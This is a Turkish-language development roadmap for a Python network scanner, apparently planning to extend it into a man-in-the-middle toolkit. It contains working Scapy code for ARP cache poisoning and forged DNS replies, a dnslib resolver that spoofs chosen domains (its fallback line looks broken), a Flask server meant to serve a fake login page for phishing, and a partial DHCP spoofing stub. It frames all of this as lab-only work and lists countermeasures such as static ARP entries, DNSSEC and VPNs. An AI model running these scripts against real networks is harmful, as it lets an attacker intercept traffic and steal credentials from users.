# ScanMatrix Geliştirme Yol Haritası


Bu yol haritası, mevcut ağ tarama ve güvenlik analizi aracı ile DNS spoofing özelliklerini entegre ederek kapsamlı bir güvenlik test aracı geliştirmek için hazırlanmıştır. Mevcut özellikler (cihaz keşfi, port tarama, hizmet/versiyon tespiti, zafiyet tarama, ağ topolojisi görselleştirme, GUI ve raporlama) temel alınarak, ARP spoofing, DNS spoofing, DHCP manipülasyonu ve sahte web sunucusu gibi yeni özellikler eklenecektir. **Önemli Uyarı: Bu özellikler yalnızca eğitim ve yasal izin alınmış test ortamlarında kullanılmalıdır. Yetkisiz kullanım yasa dışı ve etik dışıdır.**

## Mevcut Durum
### Özellikler
- **Cihaz Keşfi**: Scapy ile ARP tarama, Nmap ile ping tarama (IP, MAC, üretici bilgileri).
- **Port Tarama**: Scapy ile TCP SYN tarama, Nmap ile doğrulama.
- **Hizmet ve Versiyon Tespiti**: Nmap `-sV` ile hizmet, ürün ve versiyon bilgisi.
- **Zafiyet Taraması**: Nmap `vuln` ve `vulners` script’leri ile CVE tabanlı analiz.
- **İşletim Sistemi Tespiti**: Nmap `-O` ile OS profili çıkarma.
- **Ağ Topolojisi Görselleştirme**: NetworkX ve Matplotlib ile PNG çıktısı.
- **Raporlama**: JSON, CSV ve Jinja2 ile HTML raporlar.
- **Kullanıcı Arayüzü**: Tkinter GUI ve komut satırı (`argparse`).
- **Güvenlik Özellikleri**: Stealth modu (MAC sahteciliği), proxy desteği.
- **Performans**: Asenkron programlama (`asyncio`), çoklu iş parçacığı (`ThreadPoolExecutor`), progressbar ve renkli çıktılar (`colorama`).

### Teknik Altyapı
- **Kütüphaneler**: Scapy, python-nmap, NetworkX, Matplotlib, Tkinter, Jinja2, requests, colorama, netifaces, progressbar.
- **Performans**: 50 eşzamanlı iş parçacığı, asenkron tarama, düşük kaynak kullanımı.
- **Çıktılar**: Konsol, `network_scanner.log`, JSON/CSV/HTML raporlar, PNG topoloji grafiği.
- **Komut Satırı Parametreleri**: `-t/--target`, `-p/--proxies`, `--ports`, `--rate`, `--output`, `-v/--verbose`, `-s/--stealth`, `--gui`.

## Test Ortamı
- **Araçlar**: VirtualBox veya benzeri sanallaştırma yazılımı.
- **Sanal Makineler**:
  - **Saldırgan VM**: Kali Linux (veya başka bir Linux dağıtımı).
  - **Kurban VM**: Windows veya Linux.
- **Ağ Yapılandırması**: Host-only veya dahili ağ (üretim ağlarından izole).
- **Ön Koşullar**:
  - Python 3.x ve kütüphaneler: Scapy, python-nmap, dnslib, Flask.
  - IP yönlendirme: `sudo sysctl -w net.ipv4.ip_forward=1`.
  - Ağ protokolleri bilgisi (IP, ARP, DNS, DHCP).

Amaç: Mevcut özelliklerin optimizasyonu, temel DNS spoofing özelliklerinin entegrasyonu ve test ortamının hazırlanması.

### 1. Mevcut Özelliklerin Optimizasyonu
- **Hedef**: Tarama performansını artırma ve hata yönetimini güçlendirme.
  - **Görevler**:
    - Scapy tarama zaman aşımı sürelerini ağ yoğunluğuna göre dinamik ayarlama.
    - Port tarama chunk boyutunu (şu an 15) uyarlanabilir hale getirme.
    - `--max-threads` parametresiyle iş parçacığı sayısını özelleştirme.
    - Loglara tarama süresi ve kaynak kullanımı (CPU, bellek) ekleme.
  - **Süre**: 2 hafta.
  - **Başarı Kriteri**: %20 daha hızlı tarama, loglarda %100 hata kapsama.

### 2. ARP Spoofing Entegrasyonu
- **Hedef**: MITM saldırıları için ARP spoofing özelliği ekleme.
  - **Görevler**:
    - Scapy ile ARP spoofing betiği geliştirme:
      ```python
      from scapy.all import *
      import time

      def get_mac(ip):
          ans, _ = arping(ip)
          for s, r in ans:
              return r[Ether].src

      def arp_spoof(target_ip, gateway_ip):
          target_mac = get_mac(target_ip)
          gateway_mac = get_mac(gateway_ip)
          while True:
              send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
              send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
              time.sleep(2)
      ```
    - Betiği `NetworkScanner` sınıfına entegre etme (`--arp-spoof` parametresi).
    - GUI’ye ARP spoofing başlatma seçeneği ekleme (checkbox).
  - **Süre**: 2 hafta.
  - **Başarı Kriteri**: Kurban VM’de ARP tablosunda sahte MAC adresi görünmesi (`arp -a`).

### 3. Temel DNS Spoofing
- **Hedef**: DNS sorgularını yakalayıp sahte yanıtlarla yönlendirme.
  - **Görevler**:
    - Scapy ile DNS spoofing betiği geliştirme:
      ```python
      from scapy.all import *

      def dns_spoof(packet):
          if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
              spoofed_ip = "192.168.1.100"
              spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                              UDP(dport=packet[UDP].sport, sport=53)/\
                              DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                  an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
              send(spoofed_packet, verbose=0)

      sniff(filter="udp port 53", prn=dns_spoof)
      ```
    - Betiği `NetworkScanner` sınıfına entegre etme (`--dns-spoof` parametresi).
    - GUI’ye DNS spoofing için alan adı ve sahte IP girişi ekleme.
    - HTML raporlara spoofing sonuçlarını ekleme.
  - **Süre**: 3 hafta.
  - **Başarı Kriteri**: Kurban VM’de `nslookup example.com` ile sahte IP dönmesi.

### 4. GUI İyileştirmeleri
- **Hedef**: Tkinter GUI’sini DNS spoofing için genişletme ve kullanıcı deneyimini iyileştirme.
  - **Görevler**:
    - Gerçek zamanlı tarama ilerlemesi için `ttk.Progressbar` ekleme.
    - Sonuçları GUI’de tablo formatında gösterme (`ttk.Treeview`).
    - ARP ve DNS spoofing için yeni giriş alanları (hedef IP, sahte IP, alan adı).
    - Hata mesajlarını `messagebox` ile daha açık hale getirme.
  - **Süre**: 3 hafta.
  - **Başarı Kriteri**: GUI’den ARP/DNS spoofing başlatma ve sonuçların tablo görünümü.

### 5. Test Ortamı Kurulumu ve Dokümantasyon
- **Hedef**: İzole test ortamı ve kapsamlı dokümantasyon.
  - **Görevler**:
    - VirtualBox’ta host-only ağ ile Saldırgan ve Kurban VM’ler kurma.
    - Kullanım kılavuzu: Komut satırı ve GUI için (ARP/DNS spoofing dahil).
    - Kod dokümantasyonu: Yeni betikler için fonksiyon/sınıf açıklamaları.
    - README.md güncellemesi: Kurulum, kullanım örnekleri, yasal uyarılar.
  - **Süre**: 2 hafta.
  - **Başarı Kriteri**: Çalışan test ortamı, GitHub’da yayınlanmış dokümantasyon.

Amaç: DNS spoofing özelliklerini genişletme, web arayüzü ve otomasyon ekleme.

### 1. Seçmeli DNS Spoofing (DNS Proxy)
- **Hedef**: Belirli alan adlarını spoof eden bir DNS proxy sunucusu.
  - **Görevler**:
    - `dnslib` ile DNS proxy betiği geliştirme:
      ```python
      from dnslib import *
      from dnslib.server import DNSServer, BaseResolver

      class SpoofResolver(BaseResolver):
          def resolve(self, request, handler):
              reply = request.reply()
              qname = str(request.q.qname)
              if qname in ['example.com.']:
                  reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
              else:
                  reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
              return reply

      resolver = SpoofResolver()
      server = DNSServer(resolver, port=53, address='0.0.0.0')
      server.start_thread()
      ```
    - Betiği `NetworkScanner` sınıfına entegre etme (`--dns-proxy` parametresi).
    - GUI’ye alan adı/spoof IP listesi için yapılandırma dosyası yükleme seçeneği.
  - **Süre**: 3 hafta.
  - **Başarı Kriteri**: Belirli alan adları için sahte IP, diğerleri için gerçek DNS yanıtı.

### 2. Sahte Web Sunucusu Entegrasyonu
- **Hedef**: DNS spoofing ile sahte web sayfaları sunma.
  - **Görevler**:
    - Flask ile sahte web sunucusu geliştirme:
      ```python
      from flask import Flask, render_template

      app = Flask(__name__)

      @app.route('/')
      def index():
          return render_template('fake_login.html')

      if __name__ == '__main__':
          app.run(host='0.0.0.0', port=80)
      ```
    - `templates/fake_login.html` ile kimlik avı sayfası oluşturma.
    - DNS spoofing ile sahte IP’ye yönlendirme ve web sunucusunu entegre etme.
    - GUI’ye sahte web sayfası seçimi için dosya tarayıcı ekleme.
  - **Süre**: 3 hafta.
  - **Başarı Kriteri**: Kurban VM’de sahte web sayfasının görüntülenmesi.

### 3. Web Tabanlı Arayüz
- **Hedef**: Tkinter yerine veya ek olarak Flask/FastAPI ile web arayüzü.
  - **Görevler**:
    - Flask ile tarama ve spoofing için web sunucusu oluşturma.
    - Web arayüzünde hedef/port/alan adı girişi, tarama/spoofing başlatma.
    - HTML raporları ve topoloji görselleştirmesini web’de görüntüleme.
  - **Süre**: 4 hafta.
  - **Başarı Kriteri**: Web arayüzünden tarama ve spoofing başlatma.

### 4. Otomasyon ve Karşılaştırma
- **Hedef**: Düzenli tarama/spoofing ve sonuç karşılaştırma.
  - **Görevler**:
    - `schedule` ile periyodik tarama/spoofing planlama.
    - SQLite ile tarama/spoofing sonuçlarını kaydetme.
    - Önceki taramalarla karşılaştırma (yeni cihaz/port/zafiyet).
  - **Süre**: 3 hafta.
  - **Başarı Kriteri**: Otomatik tarama ve rapor karşılaştırması.

Amaç: Gelişmiş spoofing, bulut entegrasyonu ve platform bağımsızlığı.

### 1. DHCP Manipülasyonu
- **Hedef**: Sahte DHCP teklifleriyle yanlış DNS sunucusu atama.
  - **Görevler**:
    - Scapy ile DHCP spoofing betiği:
      ```python
      from scapy.all import *

      def dhcp_spoof(packet):
          if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:
              fake_dns = "192.168.1.100"
              # Sahte DHCP yanıtı oluşturma (detaylı yapılandırma gerekir)
              # send(dhcp_offer)

      sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
      ```
    - Betiği `NetworkScanner` sınıfına entegre etme (`--dhcp-spoof`).
    - GUI’ye DHCP spoofing için yapılandırma ekleme.
  - **Süre**: 4 hafta.
  - **Başarı Kriteri**: Kurban VM’de `ipconfig /renew` ile sahte DNS sunucusu atanması.

### 2. Bulut Tabanlı Rapor Depolama
- **Hedef**: Tarama ve spoofing sonuçlarını bulutta saklama.
  - **Görevler**:
    - AWS S3 veya Firebase ile rapor depolama.
    - Paylaşılabilir rapor linkleri oluşturma.
    - Kullanıcı kimlik doğrulaması için oturum sistemi.
  - **Süre**: 4 hafta.
  - **Başarı Kriteri**: Raporların bulutta saklanması ve güvenli paylaşımı.

### 3. Mobil Uygulama Desteği
- **Hedef**: Mobil cihazlarda tarama/spoofing kontrolü.
  - **Görevler**:
    - Kivy/Flutter ile çapraz platform mobil arayüz.
    - Web API ile tarama/spoofing başlatma ve sonuç alma.
    - Push bildirimleriyle tamamlanma uyarıları.
  - **Süre**: 6 hafta.
  - **Başarı Kriteri**: iOS/Android’de çalışan mobil uygulama.

### 4. Makine Öğrenimi ile Zafiyet Analizi
- **Hedef**: Zafiyetlerin önem derecesini tahmin etme.
  - **Görevler**:
    - Scikit-learn ile sınıflandırma modeli geliştirme.
    - CVE verilerinden veri seti oluşturma.
    - Modeli zafiyet tarama sonuçlarına entegre etme.
  - **Süre**: 6 hafta.
  - **Başarı Kriteri**: %80 doğrulukla zafiyet önem derecesi tahmini.

## Test Süreci
- **ARP Spoofing**: Kurban VM’de `arp -a` ile sahte MAC adresi kontrolü.
- **DNS Spoofing**: Kurban VM’de `nslookup example.com` ile sahte IP kontrolü.
- **DHCP Spoofing**: Kurban VM’de `ipconfig /renew` veya `dhclient` ile sahte DNS sunucusu kontrolü.
- **Sahte Web Sunucusu**: Kurban VM’de sahte domaine erişim ve sayfa görüntüleme.
- **Tarama Özellikleri**: Mevcut cihaz/port/zafiyet tarama sonuçlarının doğruluğu.
- **Ortam**: VirtualBox’ta host-only ağ, üretim ağlarından izole.

## Karşı Önlemler ve Etik Kullanım
- **Statik ARP Girişleri**: ARP spoofing’i önler.
- **DNSSEC**: DNS sorgularını doğrular.
- **HTTPS**: Sertifika uyarılarına dikkat.
- **VPN**: Trafiği şifreler, yerel manipülasyonları engeller.
- **Etik Kullanım**: Yalnızca izinli test ortamlarında kullanım, yasal uyarıların dokümantasyona eklenmesi.

## Genel Plan ve Öncelikler
- **Öncelikler**:
  1. Mevcut özellik optimizasyonu ve ARP/DNS spoofing entegrasyonu.
  2. Web arayüzü, seçmeli DNS spoofing ve sahte web sunucusu.
  3. DHCP spoofing, bulut, mobil ve ML entegrasyonu.
- **Kaynaklar**:
  - 1-2 geliştirici, haftada 20 saat.
  - Araçlar: Python, GitHub, VirtualBox, AWS/Firebase.
- **Test ve Kalite Güvencesi**:
  - Birim testleri (`unittest`) her aşamada.
  - Farklı ağ ortamlarında test (yerel, VPN).
  - Kullanıcı geri bildirimleriyle önceliklendirme.

## Başarı Kriterleri
- **Kullanıcılar**: Hızlı tarama/spoofing, sezgisel arayüz, kapsamlı raporlar.
- **Geliştiriciler**: Modüler kod, kapsamlı dokümantasyon, genişletilebilirlik.
- **Güvenlik**: %90 zafiyet/spoofing doğruluğu, anonim tarama desteği.
